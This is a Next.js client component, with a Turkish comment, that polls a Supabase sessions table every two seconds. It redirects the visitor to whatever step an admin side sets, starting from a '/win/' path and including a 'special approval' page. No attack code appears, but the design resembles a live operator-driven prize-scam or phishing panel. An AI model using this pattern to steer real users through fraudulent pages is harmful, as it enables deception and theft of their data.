"use client";

import { useEffect, useMemo } from "react";
import { usePathname } from "next/navigation";
import { stepToPath } from "@/lib/session-routes";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { persistActiveSession } from "@/lib/session-id-client";
import type { SessionStatus, SessionStep } from "@/types/session";

function getSessionIdFromPath(pathname: string): string | null {
  if (pathname.startsWith("/win/")) {
    const parts = pathname.split("/");
    return parts[2] || null;
  }
  return null;
}

export function GlobalStatusWatcher() {
  const pathname = usePathname();

  const sessionId = useMemo(() => {
    if (pathname.startsWith("/admin")) return null;
    const fromPath = getSessionIdFromPath(pathname);
    if (fromPath) return fromPath;
    try {
      const query = new URLSearchParams(window.location.search);
      const fromQuery = query.get("session");
      if (fromQuery) return fromQuery;
    } catch {
      /* ignore */
    }
    try {
      return localStorage.getItem("activeSessionId");
    } catch {
      return null;
    }
  }, [pathname]);

  useEffect(() => {
    if (pathname.startsWith("/admin")) return;
    if (!sessionId) return;
    persistActiveSession(sessionId);
  }, [sessionId, pathname]);

  useEffect(() => {
    if (pathname.startsWith("/admin")) return;
    if (!sessionId) return;
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;

    const checkStatus = async () => {
      const { data } = await supabase
        .from("sessions")
        .select("status,current_step")
        .eq("id", sessionId)
        .maybeSingle();
      if (!data) return;

      if (window.location.pathname.startsWith("/admin")) return;

      const currentStep = data.current_step as SessionStep | undefined;
      const status = data.status as SessionStatus | undefined;

      if (currentStep) {
        const target = stepToPath(currentStep, sessionId);
        const targetPathname = (() => {
          try {
            return new URL(target, window.location.origin).pathname;
          } catch {
            return target;
          }
        })();

        // Kullanıcı zaten hedef sayfadaysa tekrar yönlendirme yapma (döngü engeli).
        if (window.location.pathname === targetPathname || window.location.pathname === `/${currentStep}`) {
          return;
        }

        window.location.href = target;
        return;
      }

      if (status === "SPECIAL_INFO" && window.location.pathname !== "/special-approval") {
        window.location.href = "/special-approval";
      }
    };

    void checkStatus();
    const timer = window.setInterval(() => {
      void checkStatus();
    }, 2000);

    return () => window.clearInterval(timer);
  }, [sessionId, pathname]);

  return null;
}
